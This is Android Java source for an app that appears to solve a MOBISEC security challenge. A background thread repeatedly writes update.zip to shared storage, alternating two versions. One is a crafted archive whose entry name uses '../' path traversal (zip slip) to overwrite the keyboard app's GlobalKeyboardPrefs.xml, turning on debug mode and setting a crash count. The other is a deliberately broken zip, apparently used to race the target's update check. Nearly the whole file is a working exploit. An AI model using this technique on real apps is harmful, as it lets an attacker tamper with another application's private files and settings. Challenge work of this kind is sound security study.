package com.example.keyboard;

import androidx.appcompat.app.AppCompatActivity;

import android.os.Bundle;
import android.util.Log;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStreamWriter;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        //Log.i("MOBISEC", Environment.getExternalStorageDirectory().toString());
        //2-15 21:35:53.696  4527  4527 I MOBISEC : /storage/emulated/0


        new Thread(new Runnable() {
            @Override
            public void run() {

                while(true) {

                    //Log.w("MOBISEC", "copy zip with lobalKeyboardPrefs.xml");
                    //copyAssetsSingleFile("/storage/emulated/0", "goodzip/update.zip", "update.zip");

                    putZipWithShared("/storage/emulated/0/update.zip");

                    try {
                        Thread.sleep(2000);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }

                    /*File zipFile = new File("/storage/emulated/0/update.zip");
                    try {
                        ZipFile zip = new ZipFile(zipFile);
                    } catch (IOException e) {
                        Log.w("MOBISEC","ZipFile:" + e);
                    }
                    String destDir = zipFile.getParent();
                    Log.i("MOBISEC",":" + destDir);*/


                  //  Log.w("MOBISEC", "copy bad update.zip");
                    putBadZip("/storage/emulated/0/update.zip");
                    //copyAssetsSingleFile("/storage/emulated/0", "update.zip", "update.zip");
                    try {
                        Thread.sleep(2000);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }

                }
            }
        }).start();//https://blog.csdn.net/qq_33833327/article/details/70946086





    }

    private void putBadZip(String path){
        try {
            File badFile = new File(path);
            FileOutputStream fileOutputStream = new FileOutputStream(badFile);
            OutputStreamWriter outputStreamWriter = new OutputStreamWriter(fileOutputStream);
            outputStreamWriter.append("this is a bad zip file! ");
            outputStreamWriter.close();
            fileOutputStream.close();
        } catch (Exception e){
            Log.w("MOBISEC","putBadZip: " + e);
        }
    }


    private void putZipWithShared(String path){
        try {
            File file = new File(path);
            ZipOutputStream zipOutputStream = new ZipOutputStream(new FileOutputStream(file));
            ZipEntry zipentry = new ZipEntry("../../../../../../../../data/data/com.mobisec.keyboard/shared_prefs/GlobalKeyboardPrefs.xml");
            zipOutputStream.putNextEntry(zipentry);
            String stringxml=        "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n" +
                    "<map>\n" +
                    "    <int name=\"crashes\" value=\"999\" />\n" +
                    "    <boolean name=\"debugmode\" value=\"true\" />" +
                    "</map>";
            zipOutputStream.write((byte[])stringxml.getBytes(), 0, ((byte[])stringxml.getBytes()).length);
            zipOutputStream.closeEntry();
            zipOutputStream.close();
        } catch (Exception e){
            Log.w("MOBISEC","putZipWithShared: " + e);
        }
    }



    /**
     * 复制单个文件
     *
     * @param outPath String 输出文件路径 如：data/user/0/com.test/files
     * @param fileName String 要复制的文件名 如：abc.txt
     * @return <code>true</code> if and only if the file was copied; <code>false</code> otherwise
     */
    private boolean copyAssetsSingleFile(String outPath, String fileName, String outfilename) {
        File file = new File(outPath);
        if (!file.exists()) {
            if (!file.mkdirs()) {
                Log.e("MOBISEC","--Method--"+ "copyAssetsSingleFile: cannot create directory.");
                return false;
            }
        }
        try {
            InputStream inputStream = getAssets().open(fileName);
            File outFile = new File(file, outfilename);
            FileOutputStream fileOutputStream = new FileOutputStream(outFile);
            // Transfer bytes from inputStream to fileOutputStream
            byte[] buffer = new byte[1024];
            int byteRead;
            while (-1 != (byteRead = inputStream.read(buffer))) {
                fileOutputStream.write(buffer, 0, byteRead);
            }
            inputStream.close();
            fileOutputStream.flush();
            fileOutputStream.close();
            return true;
        } catch (IOException e) {
            Log.w("MOBISEC", Log.getStackTraceString(e));
            return false;
        }
    }//https://blog.csdn.net/u013642500/article/details/80069811


}